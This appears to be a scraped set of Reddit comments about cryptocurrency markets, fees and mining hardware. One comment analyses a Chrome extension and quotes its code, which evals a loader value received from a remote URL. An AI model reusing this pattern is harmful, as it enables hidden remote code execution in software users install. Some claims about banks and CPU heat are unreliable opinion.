The problem is: you can‘t know if it gets mass adoption. Sure you can believe in this tech, but no one knows where we are heading and which cryptocurrency wins

I don‘t know...? I just did not care about the fees. They basically want you to hate on Bitcoin... i won‘t. 
Just relax.. Tech will adapt over time IMHO

In my case the amazon voucher was bought anonymously. Of course Amazon could ask the voucher seller for my sending address.. But that should not happen, due to law.
But I agree with you.. at least you should spend some thoughts about that and be cautious.
@_date: 2017-12-06 19:41:46
I think you are right... the less orders there are, the higher the price can reach more easily.

It did happend exactly like that before. Bitcoin +20% means altcoins round about -20%.

We should have the currency pair
BTC/APPLE, because the price of an apple is more stable than $USD.

In C/C++ assert is natively supported and compiles into:

Okay, you got me. Those were the thinks I've read at r/litecoin in the past months.
I am always glad if there is someone who knows way better than me. 
Thank you.
Let me at least correct my first sentence:
LN must still get mass-tested in order to know, whether it proves as a good way to lower the tx-fees.

I don‘t think that any altcoin will be greater than Bitcoin, because Bitcoin was the first.

They tell on their website:

Zero trading fee does not mean zero income. SophonEX generates revenue through our value-added services, such as margin trading, advanced trading tools and other premium services.

Just because it went to 20k once, it does not mean it was worth 20k. We need serious adoption in order to see big prices again.
Obviously, the bear market is not over yet. We need to be patient.
Another small anecdote I would like to bring up: gold was like bitcoin some years ago. It peaked to an incredible price, then they introduced CME futures at the peak, the price felt down, and since then the price of gold behaved incredibly stable
I do not say that bitcoin behaves like gold, just wanted to bring this up
@_date: 2017-11-27 19:11:42
Pff.. 50k.. if it continues to rise that fast it will be either at 1k or 500k

Do some research. A money credit is not actual money the bank has. 
That way, a bank does not loose money, if you can‘t pay it back. They win money if you pay it back.
A bank only has to own 20% of the money they lend you. 
That is why we need cryptocurrencies. Because banks are scam

Why should it damage a CPU? For what technical reason you see potential damages? 
The only way it gets damaged is by producing too much heat.
As long as you can touch your CPU for a couple of seconds it is not considered hot.
Of course it gets too hot if the hardware owner did not care about cooling.
But then again, he should not operate any computer.

Good point. Many laptops have insufficient cooling hardware indeed.
Degradation would mean, components get damaged over time such as transistors, which would result in too many errors.
Electrons won't slow down over time, though.

@_date: 2018-02-06 19:20:47
Not if you‘re complaining about short term loss. Buying at an ATH (short term) is generally too risky. Off course there is a chance that it is still profitable when waiting a long time.. :-)
@_date: 2017-09-09 08:06:27
I've read that EOS will address this specific issue. EOS will be using asynchronous connections, allowing faster transactions, bur faster sync as well.

All I could find out within three minutes was the following:
The chrome extension uses an interface api:
    "{"lastUpdate":1,"updateDiff":1,"loader":{},"sections":{},"pushData":{},"staticInfo":{"addonname":"scrollbars","addonversion":"","browserversion":""},"interface":"
I couldn't find anything special about that URL, though.
(That object results from bg.js)
Note that this url could easily return another URL to redirect to, as it uses:
&amp;nbsp; 
    try {
        (function(b) {
            eval(a.data.loader.value)
        })([a, a.sections, lx, mx])
    } catch (g) {
        setTimeout(5e3, nx)
    }
to execute content that it received via this URL.
@_date: 2017-09-09 08:22:43
I did wait 1 total week, but it stopped at a certain block and never continued... :-(
@_date: 2017-09-18 04:39:07
Actually, eval can be used to execute any javascript code.
Basically this loader will not only load "bad" javascript code. In this case it must also load the intended module code, as there is no source file providing the module functionalities. The module owner does not need to update the module in chrome webstore anymore; he may simply change the remote code.
@_date: 2017-09-02 13:46:15
